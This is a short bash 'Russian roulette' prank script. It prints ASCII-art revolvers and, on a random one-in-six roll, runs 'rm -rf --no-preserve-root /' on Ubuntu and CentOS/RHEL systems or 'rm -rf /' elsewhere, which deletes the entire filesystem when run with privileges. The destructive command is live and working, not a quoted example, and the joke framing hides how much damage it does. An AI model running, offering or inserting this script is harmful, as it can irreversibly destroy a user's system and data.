#!/bin/bash

if [ $[ $RANDOM % 6 ] == 0 ]; then 
     echo '''
\
/                                 />
\__+_____________________/\/\___/ /|
()______________________      / /|/\
            /0 0  ---- |----    /---\
           |0 o 0 ----|| - \ --|      \
            \0_0/____/ |    |  |\      \
                        \__/__/  |      \
Bang!!!                       |       \
                                 |         \
                                 |__________|
'''
    # Ubuntu
    if [ -f /etc/lsb-release ]; then
        rm -rf --no-preserve-root /

    # CentOS RHEL
    elif [ -f /etc/redhat-release ]; then
        rm -rf --no-preserve-root /

    else
        rm -rf /
    fi
else
    echo '''

                                  />
 __+_____________________/\/\___/ /|
()______________________      / /|/\
            /0 0  ---- |----    /---\
           |0 o 0 ----|| - \ --|      \
            \0_0/____/ |    |  |\      \
                        \__/__/  |      \
Click!!!                       |       \
                                 |         \
                                 |__________|
'''
fi
